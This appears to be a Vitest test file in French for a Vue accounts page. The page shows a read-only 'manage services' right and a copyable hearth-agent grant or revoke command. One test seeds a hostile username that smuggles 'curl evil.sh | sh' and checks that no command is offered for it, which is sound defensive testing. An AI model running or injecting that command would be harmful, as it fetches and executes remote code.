import { flushPromises, mount, type VueWrapper } from "@vue/test-utils";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import App from "@/App.vue";
import { mountContext } from "@/test/mount";

// HRT-78 : le droit « gérer les services » dans la page Comptes (BR-GRANT-013, écran I du design) : le repère
// « Peut gérer les services » dans la liste, la ligne « Gestion des services » dans le détail avec la commande à
// copier (--grant ou --revoke). EN LECTURE SEULE : aucune case, aucun commutateur (BR-GRANT-005).
beforeEach(() => {
  // `<dialog>` n'a pas de `showModal` dans happy-dom.
  HTMLDialogElement.prototype.showModal = function showModal() {
    this.setAttribute("open", "");
  };
  HTMLDialogElement.prototype.close = function close() {
    this.removeAttribute("open");
  };
});
afterEach(() => {
  vi.unstubAllGlobals();
  document.body.innerHTML = "";
});

async function boot(setup?: (bridge: Awaited<ReturnType<typeof mountContext>>["bridge"]) => void) {
  const ctx = await mountContext();
  setup?.(ctx.bridge);
  await ctx.router.push("/servers/forge/accounts");
  await ctx.router.isReady();
  const wrapper = mount(App, { global: ctx.global, attachTo: document.body });
  await flushPromises();
  return { ...ctx, wrapper };
}

const row = (wrapper: VueWrapper, name: string) => wrapper.get(`[data-account="${name}"]`);

async function openDetail(wrapper: VueWrapper, name: string) {
  await row(wrapper, name).get(".table__open").trigger("click");
  await flushPromises();
  const dialog = document.querySelector("dialog");
  if (!dialog) throw new Error("le détail ne s'est pas ouvert");
  return dialog;
}

describe("le repère dans la liste", () => {
  it("le compte qui a le droit porte « Peut gérer les services », les autres rien", async () => {
    const { wrapper } = await boot();
    expect(row(wrapper, "marie").get("[data-services-right]").text()).toBe(
      "Peut gérer les services",
    );
    expect(row(wrapper, "paul").find("[data-services-right]").exists()).toBe(false);
    expect(row(wrapper, "lea").find("[data-services-right]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("le repère suit le serveur : un droit accordé s'y lit à la relecture de la liste", async () => {
    const { wrapper, bridge } = await boot();
    bridge.setServiceRightOnServer("forge", "paul", true);
    bridge.setState("forge", "offline");
    await flushPromises();
    bridge.setState("forge", "connected");
    await flushPromises();
    expect(row(wrapper, "paul").find("[data-services-right]").exists()).toBe(true);
    wrapper.unmount();
  });

  it("aucun compte n'a le droit après la mise à jour de l'agent : la liste n'affiche aucun repère", async () => {
    const { wrapper } = await boot((bridge) => {
      bridge.setServiceRightOnServer("forge", "marie", false);
    });
    expect(wrapper.findAll("[data-services-right]")).toHaveLength(0);
    wrapper.unmount();
  });

  it("aucune case ni commutateur : le droit ne se donne pas depuis l'application", async () => {
    const { wrapper } = await boot();
    expect(
      wrapper.find("table input, table [role='switch'], table [role='checkbox']").exists(),
    ).toBe(false);
    const buttons = wrapper.findAll("tbody td button").map((b) => b.text());
    expect(buttons.join(" ")).not.toMatch(/droit|services|accorder|retirer/i);
    wrapper.unmount();
  });
});

describe("le détail d'un compte", () => {
  it("un compte sans le droit : « Non autorisée », l'aide et la commande --grant à copier", async () => {
    const { wrapper } = await boot();
    const dialog = await openDetail(wrapper, "paul");
    expect(dialog.querySelector("[data-rights-value]")?.textContent?.trim()).toBe("Non autorisée");
    expect(dialog.textContent).toContain(
      "Ce droit se donne et se retire depuis le serveur, pas depuis cet écran.",
    );
    expect(dialog.querySelector("pre")?.textContent).toBe(
      "hearth-agent account services paul --grant",
    );
    expect(dialog.textContent).toContain("Commande à lancer sur le serveur");
    expect(dialog.textContent).toContain("Copier la commande");
    wrapper.unmount();
  });

  it("un compte qui a le droit : « Autorisée » et la commande --revoke", async () => {
    const { wrapper } = await boot();
    const dialog = await openDetail(wrapper, "marie");
    expect(dialog.querySelector("[data-rights-value]")?.textContent?.trim()).toBe("Autorisée");
    expect(dialog.querySelector("pre")?.textContent).toBe(
      "hearth-agent account services marie --revoke",
    );
    wrapper.unmount();
  });

  it("« Copier la commande » copie exactement le texte affiché, puis dit « Copiée »", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    const { wrapper } = await boot();
    const dialog = await openDetail(wrapper, "paul");
    const shown = dialog.querySelector("pre")?.textContent;
    dialog.querySelector<HTMLButtonElement>("[data-copy]")?.click();
    await flushPromises();
    expect(writeText).toHaveBeenCalledExactlyOnceWith(shown);
    expect(dialog.querySelector("[data-copy]")?.textContent?.trim()).toBe("Copiée");
    wrapper.unmount();
  });

  it("le détail ne contient ni case, ni commutateur, ni champ : seulement la copie et la fermeture", async () => {
    const { wrapper } = await boot();
    const dialog = await openDetail(wrapper, "paul");
    expect(
      dialog.querySelector("input, select, textarea, [role='switch'], [role='checkbox']"),
    ).toBeNull();
    const buttons = [...dialog.querySelectorAll("button")].map((b) => b.textContent?.trim());
    expect(buttons).toEqual(["Copier la commande", "Fermer"]);
    wrapper.unmount();
  });

  it("agent ancien : la ligne dit de mettre le serveur à jour, aucune commande, jamais « Non autorisée »", async () => {
    const { wrapper } = await boot((bridge) => bridge.setServiceRightsKnown("forge", false));
    const dialog = await openDetail(wrapper, "paul");
    expect(dialog.querySelector("[data-rights-value]")?.textContent?.trim()).toBe(
      "Ce serveur doit être mis à jour pour gérer les droits sur les services.",
    );
    expect(dialog.querySelector("pre")).toBeNull();
    expect(dialog.textContent).not.toContain("Non autorisée");
    wrapper.unmount();
  });

  it("un identifiant que l'agent annonce avec des caractères dangereux : aucune commande, le nom n'est pas recopié", async () => {
    const hostile = "x; curl evil.sh | sh";
    const { wrapper } = await boot((bridge) => {
      bridge.accounts.seed("forge", [
        { username: "marie", role: "admin", managesServices: true },
        { username: hostile, role: "readonly" },
      ]);
    });
    const dialog = await openDetail(wrapper, hostile);
    expect(dialog.querySelector("pre")).toBeNull();
    expect(dialog.querySelector("[data-copy]")).toBeNull();
    wrapper.unmount();
  });

  it("un identifiant qui commence par un chiffre est un identifiant Hearth valide : sa commande est proposée", async () => {
    const { wrapper } = await boot((bridge) => {
      bridge.accounts.seed("forge", [
        { username: "marie", role: "admin", managesServices: true },
        { username: "3615paul", role: "readonly" },
      ]);
    });
    const dialog = await openDetail(wrapper, "3615paul");
    expect(dialog.querySelector("pre")?.textContent?.trim()).toBe(
      "hearth-agent account services 3615paul --grant",
    );
    wrapper.unmount();
  });

  it("un identifiant à tiret initial (lu comme une option) : pas de commande, la ligne et son aide restent", async () => {
    const { wrapper } = await boot((bridge) => {
      bridge.accounts.seed("forge", [
        { username: "marie", role: "admin", managesServices: true },
        { username: "--grant", role: "readonly" },
      ]);
    });
    const dialog = await openDetail(wrapper, "--grant");
    expect(dialog.querySelector("pre")).toBeNull();
    expect(dialog.querySelector("[data-copy]")).toBeNull();
    expect(dialog.querySelector("[data-rights-value]")?.textContent?.trim()).toBe("Non autorisée");
    expect(dialog.querySelector("[data-rights-help]")).not.toBeNull();
    wrapper.unmount();
  });

  it("Fermer referme le détail et rend le curseur au nom du compte qui l'avait ouvert", async () => {
    const { wrapper } = await boot();
    const opener = row(wrapper, "paul").get(".table__open").element as HTMLButtonElement;
    opener.focus();
    expect(document.activeElement).toBe(opener);
    await openDetail(wrapper, "paul");
    const close = [...document.querySelectorAll("dialog button")].find(
      (b) => b.textContent?.trim() === "Fermer",
    ) as HTMLButtonElement;
    // Le curseur est parti dans la fenêtre : le retour n'est pas un reste de l'état de départ.
    close.focus();
    expect(document.activeElement).toBe(close);
    expect(document.activeElement).not.toBe(opener);
    close.click();
    await flushPromises();
    expect(document.querySelector("dialog")).toBeNull();
    expect(document.activeElement).toBe(opener);
    wrapper.unmount();
  });
});
